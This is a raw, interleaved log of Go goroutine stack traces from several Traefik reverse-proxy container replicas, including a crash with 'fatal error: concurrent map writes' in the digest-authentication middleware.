traefik.1.ncnc3bnddh65@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.(*pool).go.func1()
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:78 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*tcplistener).accepttcp( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/tcpsock.go:234 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ncnc3bnddh65@ns3000001 | net/http.tcpkeepalivelistener.accept( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:3120 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 62 [chan receive, 5645 minutes]:
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/server.(*server).listensignals( )
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*server).listenandserve( , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2636 +
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server_signals.go:18 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/server.(*server).start
traefik.1.ncnc3bnddh65@ns3000001 | net/http.listenandserve( , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:195 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2882 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/provider/web.(*provider).provide.func4()
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 21 [io wait]:
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/provider/web/web.go:149 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ncnc3bnddh65@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ncnc3bnddh65@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ncnc3bnddh65@ns3000001 | goroutine 7091 [runnable]:
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*fd).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:126 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*netfd).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/fd_unix.go:202 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*conn).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/net.go:176 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*persistconn).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/transport.go:1391 +
traefik.1.ncnc3bnddh65@ns3000001 | internal/poll.(*fd).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | bufio.(*reader).fill( )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:126 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/bufio/bufio.go:97 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*netfd).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | bufio.(*reader).peek( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/fd_unix.go:202 +
traefik.1.ncnc3bnddh65@ns3000001 | net.(*conn).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/bufio/bufio.go:129 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*persistconn).readloop( )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/net.go:176 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/transport.go:1539 +
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*connreader).read( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:753 +
traefik.1.ubjug9usvfo0@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.ncnc3bnddh65@ns3000001 | bufio.(*reader).fill( )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/transport.go:1186 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/bufio/bufio.go:97 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | bufio.(*reader).readslice( , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/bufio/bufio.go:338 +
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 22 [select]:
traefik.1.ncnc3bnddh65@ns3000001 | bufio.(*reader).readline( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*persistconn).writeloop( )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/bufio/bufio.go:367 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/transport.go:1759 +
traefik.1.ncnc3bnddh65@ns3000001 | net/textproto.(*reader).readlineslice( , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | created by net/http.(*transport).dialconn
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/transport.go:1187 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/textproto/reader.go:55 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ncnc3bnddh65@ns3000001 | net/textproto.(*reader).readline( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | goroutine 34 [io wait]:
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/textproto/reader.go:36 +
traefik.1.ncnc3bnddh65@ns3000001 | net/http.readrequest( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/request.go:925 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*conn).readrequest( , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:933 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ncnc3bnddh65@ns3000001 | net/http.(*conn).serve( , , )
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:1739 +
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.ncnc3bnddh65@ns3000001 | created by net/http.(*server).serve
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.ncnc3bnddh65@ns3000001 | /usr/local/go/src/net/http/server.go:2720 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*tcplistener).accepttcp( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/tcpsock.go:234 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.tcpkeepalivelistener.accept( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:3120 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*server).listenandserve( , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2636 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.listenandserve( , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2882 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/provider/web.(*provider).provide.func4()
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/provider/web/web.go:149 +
traefik.1.ubjug9usvfo0@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.ubjug9usvfo0@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.ubjug9usvfo0@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | goroutine 23426 [runnable]:
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*conn).serve( , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:1690
traefik.1.ubjug9usvfo0@ns3000001 | created by net/http.(*server).serve
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:2720 +
traefik.1.ubjug9usvfo0@ns3000001 | traefik.1.ubjug9usvfo0@ns3000001 | goroutine 23245 [io wait]:
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.ubjug9usvfo0@ns3000001 | internal/poll.(*fd).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:126 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*netfd).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/fd_unix.go:202 +
traefik.1.ubjug9usvfo0@ns3000001 | net.(*conn).read( , , , , , , )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/net.go:176 +
traefik.1.ubjug9usvfo0@ns3000001 | net/http.(*connreader).backgroundread( )
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:660 +
traefik.1.ubjug9usvfo0@ns3000001 | created by net/http.(*connreader).startbackgroundread
traefik.1.ubjug9usvfo0@ns3000001 | /usr/local/go/src/net/http/server.go:656 +
traefik.1.p6y5l5dzf6gu@ns3000001 | fatal error: concurrent map writes
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 54355 [running]:
traefik.1.p6y5l5dzf6gu@ns3000001 | runtime.throw( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/panic.go:605 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | runtime.mapassign_faststr( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/hashmap_fast.go:607 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/abbot/go-http-auth.(*digestauth).requireauth( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/abbot/go-http-auth/digest.go:91 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/middlewares/auth.newauthenticator.func2( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:55 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/middlewares/auth.(*authenticator).servehttp( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:106 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/provider/web.(*provider).provide.func4.1( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/provider/web/web.go:139 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.serverhandler.servehttp( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2619 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*conn).serve( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:1801 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | runtime.goexit()
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/asm_amd64.s:2337 + fp= sp= pc=
traefik.1.p6y5l5dzf6gu@ns3000001 | created by net/http.(*server).serve
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2720 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 1 [chan receive, 4089 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).wait(...)
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:200
traefik.1.p6y5l5dzf6gu@ns3000001 | main.run( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:302 +
traefik.1.p6y5l5dzf6gu@ns3000001 | main.main.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:59 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:83 +
traefik.1.p6y5l5dzf6gu@ns3000001 | main.main()
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:227 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 34 [chan receive, 4089 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1.1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:194 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.operationwithrecover.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:160 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/provider/docker.(*provider).provide.func1()
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/provider/docker/docker.go:251 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 15 [chan receive, 2 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/golang/glog.(*loggingt).flushdaemon( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:879 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/vendor/github.com/golang/glog.init.0
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:410 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 50 [syscall, 4089 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | os/signal.signal_recv( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/sigqueue.go:131 +
traefik.1.p6y5l5dzf6gu@ns3000001 | os/signal.loop()
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/os/signal/signal_unix.go:22 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by os/signal.init.0
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/os/signal/signal_unix.go:28 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 51 [semacquire, 131 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | sync.runtime_notifylistwait( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/sema.go:507 +
traefik.1.p6y5l5dzf6gu@ns3000001 | sync.(*cond).wait( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/sync/cond.go:56 +
traefik.1.p6y5l5dzf6gu@ns3000001 | io.(*pipe).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/io/pipe.go:47 +
traefik.1.p6y5l5dzf6gu@ns3000001 | io.(*pipereader).read( , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/io/pipe.go:130 +
traefik.1.p6y5l5dzf6gu@ns3000001 | bufio.(*scanner).scan( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/bufio/scan.go:207 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerscanner( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:51 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerlevel
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:43 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 65 [chan receive, 1209 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | main.checknewversion.func1()
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:349 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/safe.gowithrecover.func1( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:142 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/safe.gowithrecover
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/safe/routine.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 66 [select, 4089 minutes, locked to thread]:
traefik.1.p6y5l5dzf6gu@ns3000001 | runtime.gopark( , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/proc.go:287 +
traefik.1.p6y5l5dzf6gu@ns3000001 | runtime.selectgo( , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/select.go:395 +
traefik.1.p6y5l5dzf6gu@ns3000001 | runtime.ensuresigm.func1()
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/signal_unix.go:511 +
traefik.1.p6y5l5dzf6gu@ns3000001 | runtime.goexit()
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/asm_amd64.s:2337 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 67 [sleep]:
traefik.1.p6y5l5dzf6gu@ns3000001 | time.sleep( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/time.go:65 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/vendor/github.com/thoas/stats.new
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 68 [io wait, 53 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*tcplistener).accept( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/tcpsock.go:247 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...)
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:630 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/server.(*server).starthttpservers
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/server/server.go:271 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 69 [sleep]:
traefik.1.p6y5l5dzf6gu@ns3000001 | time.sleep( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/time.go:65 +
traefik.1.p6y5l5dzf6gu@ns3000001 | github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( )
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
traefik.1.p6y5l5dzf6gu@ns3000001 | created by github.com/containous/traefik/vendor/github.com/thoas/stats.new
traefik.1.p6y5l5dzf6gu@ns3000001 | /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 +
traefik.1.p6y5l5dzf6gu@ns3000001 | traefik.1.p6y5l5dzf6gu@ns3000001 | goroutine 70 [io wait, 2 minutes]:
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.runtime_pollwait( , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/runtime/netpoll.go:173 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).wait( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*polldesc).waitread( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
traefik.1.p6y5l5dzf6gu@ns3000001 | internal/poll.(*fd).accept( , , , , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/internal/poll/fd_unix.go:335 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*netfd).accept( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/fd_unix.go:238 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*tcplistener).accept( , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/tcpsock_posix.go:136 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net.(*tcplistener).accept( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/tcpsock.go:247 +
traefik.1.p6y5l5dzf6gu@ns3000001 | crypto/tls.(*listener).accept( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/crypto/tls/tls.go:52 +
traefik.1.p6y5l5dzf6gu@ns3000001 | net/http.(*server).serve( , , , , )
traefik.1.p6y5l5dzf6gu@ns3000001 | /usr/local/go/src/net/http/server.go:2695 +
